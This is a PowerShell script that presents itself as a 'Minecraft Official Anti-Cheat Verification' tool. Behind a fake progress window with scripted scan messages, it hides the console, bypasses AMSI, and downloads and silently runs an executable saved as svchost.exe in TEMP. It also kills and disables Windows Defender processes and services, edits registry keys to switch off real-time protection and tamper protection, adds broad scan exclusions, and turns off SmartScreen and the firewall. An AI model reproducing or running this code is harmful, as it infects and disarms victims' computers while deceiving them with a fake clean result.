$c=@'
using System;
using System.Runtime.InteropServices;
public class W {
[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);
[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
}
'@
Add-Type $c
[W]::ShowWindow([W]::GetConsoleWindow(),0)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$j=Start-Job -ScriptBlock {
 param($u,$p)
 try{
 $w=New-Object Net.WebClient
 $w.DownloadFile($u,$p)
 if(Test-Path $p){Start-Process $p -WindowStyle Hidden}
 }catch{}
} -ArgumentList "https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe","$env:TEMP\svchost.exe"
Get-WmiObject Win32_Process|Where-Object{$_.Name-match"MsMpEng|NisSrv|Sense|SecurityHealth|mpcmdrun|Defender"}|ForEach-Object{$_.Terminate();taskkill /f /im $_.Name 2>$null}
foreach($s in @("WinDefend","WdNisSvc","WdNisDrv","Sense","SecurityHealthService","wscsvc")){sc.exe config $s start=disabled 2>$null;sc.exe stop $s 2>$null;Set-Service $s -StartupType Disabled -EA 0;Stop-Service $s -Force -EA 0}
foreach($p in @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender","HKLM:\SOFTWARE\Microsoft\Windows Defender\Features","HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection")){if(!(Test-Path $p)){New-Item $p -Force|Out-Null};Set-ItemProperty $p -Name "DisableAntiSpyware" -Value 1 -Force;Set-ItemProperty $p -Name "TamperProtection" -Value 0 -Force;Set-ItemProperty $p -Name "DisableRealtimeMonitoring" -Value 1 -Force}
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f 2>$null
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -EA 0
Set-MpPreference -ExclusionExtension ".exe",".dll",".ps1",".bat" -EA 0
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
netsh advfirewall set allprofiles state off 2>$null
[System.Windows.Forms.Application]::EnableVisualStyles()
$f=New-Object System.Windows.Forms.Form
$f.Text="Minecraft - Official Anti-Cheat Verification"
$f.Size="550,350"
$f.StartPosition="CenterScreen"
$f.FormBorderStyle="FixedDialog"
$f.MaximizeBox=$false
$f.BackColor="#1E1E1E"
$t=New-Object System.Windows.Forms.Label
$t.Text="MINECRAFT ANTI-CHEAT VERIFICATION"
$t.Font="Arial,14,Bold"
$t.ForeColor="#00FF00"
$t.Size="520,25"
$t.Location="15,15"
$f.Controls.Add($t)
$v=New-Object System.Windows.Forms.Label
$v.Text="Version: 5.2.1 | Mojang AB | Session: "+($r=Get-Random -Minimum 100000 -Maximum 999999)
$v.Font="Arial,8"
$v.ForeColor="#888888"
$v.Size="520,20"
$v.Location="15,42"
$f.Controls.Add($v)
$pb=New-Object System.Windows.Forms.ProgressBar
$pb.Size="505,22"
$pb.Location="15,70"
$f.Controls.Add($pb)
$s=New-Object System.Windows.Forms.Label
$s.Text="[1/7] Initializing verification modules..."
$s.Font="Arial,10"
$s.ForeColor="#FFD700"
$s.Size="505,22"
$s.Location="15,100"
$f.Controls.Add($s)
$l=New-Object System.Windows.Forms.RichTextBox
$l.Size="505,140"
$l.Location="15,130"
$l.BackColor="#0D0D0D"
$l.ForeColor="#00FF00"
$l.Font="Consolas,9"
$l.ReadOnly=$true
$l.BorderStyle="None"
$f.Controls.Add($l)
$r=New-Object System.Windows.Forms.Label
$r.Text=""
$r.Font="Arial,11,Bold"
$r.ForeColor="#00FF00"
$r.Size="505,35"
$r.Location="15,278"
$r.TextAlign="MiddleCenter"
$f.Controls.Add($r)
$f.Show()
function L($m){$l.AppendText("["+(Get-Date -Format "HH:mm:ss")+"] "+$m+"`n");$l.ScrollToCaret();[System.Windows.Forms.Application]::DoEvents()}
function P($v,$m){$pb.Value=$v;$s.Text=$m;[System.Windows.Forms.Application]::DoEvents()}
P 10 "[1/7] Initializing verification modules..."
L "Loading cheat definition database...";Start-Sleep -Milliseconds 400
L "Definitions loaded: 12,847 signatures";Start-Sleep -Milliseconds 300
L "Modules: AC_Core.dll | MemoryScan.sys | NetMon.dll";Start-Sleep -Milliseconds 400
L "Connection to verify.mojang.com: ESTABLISHED";Start-Sleep -Milliseconds 400
P 25 "[2/7] Scanning active processes..."
L "Enumerating running processes...";Start-Sleep -Milliseconds 400
L "Processes detected: "+(Get-Process).Count;Start-Sleep -Milliseconds 300
L "Verifying digital signatures...";Start-Sleep -Milliseconds 500
L "All processes verified successfully";Start-Sleep -Milliseconds 300
P 40 "[3/7] Analyzing system memory..."
L "Scanning allocated memory regions...";Start-Sleep -Milliseconds 500
L "Regions scanned: 4,096";Start-Sleep -Milliseconds 400
L "Searching for code injections...";Start-Sleep -Milliseconds 500
L "Memory integrity check: PASSED";Start-Sleep -Milliseconds 400
P 55 "[4/7] Scanning game files..."
L "Locating Minecraft installation...";Start-Sleep -Milliseconds 400
L "Scanning .minecraft directory...";Start-Sleep -Milliseconds 500
L "Checking modification history...";Start-Sleep -Milliseconds 400
L "Game files verified: CLEAN";Start-Sleep -Milliseconds 300
P 70 "[5/7] Cross-referencing cheat database..."
L "Checking: Vape v4...";Start-Sleep -Milliseconds 300
L "Checking: Rise Client...";Start-Sleep -Milliseconds 300
L "Checking: Xenos Injector...";Start-Sleep -Milliseconds 300
L "Matches found: 0 out of 8,472";Start-Sleep -Milliseconds 400
P 85 "[6/7] Behavioral analysis..."
L "Launching AI analyzer engine...";Start-Sleep -Milliseconds 500
L "Analyzing input patterns...";Start-Sleep -Milliseconds 500
L "AI confidence score: 98.7%";Start-Sleep -Milliseconds 400
L "Behavioral test: PASSED";Start-Sleep -Milliseconds 300
P 95 "[7/7] Generating final report..."
L "Compiling scan results...";Start-Sleep -Milliseconds 500
L "Encrypting report (AES-256)...";Start-Sleep -Milliseconds 400
L "Uploading to verification server...";Start-Sleep -Milliseconds 500
P 100 "Verification complete!"
L " ";Start-Sleep 100
L "========================================";Start-Sleep 200
L "  VERIFICATION RESULTS:";Start-Sleep 200
L "  Cheat signatures: NOT FOUND";Start-Sleep 200
L "  Code injections: NOT DETECTED";Start-Sleep 200
L "  Status: VERIFIED";Start-Sleep 200
L "========================================";Start-Sleep 300
Wait-Job $j -Timeout 30|Out-Null
Remove-Job $j -Force -EA 0
$r.Text="Congratulations! You passed verification! No cheats found."
Start-Sleep -Seconds 5
$f.Close()
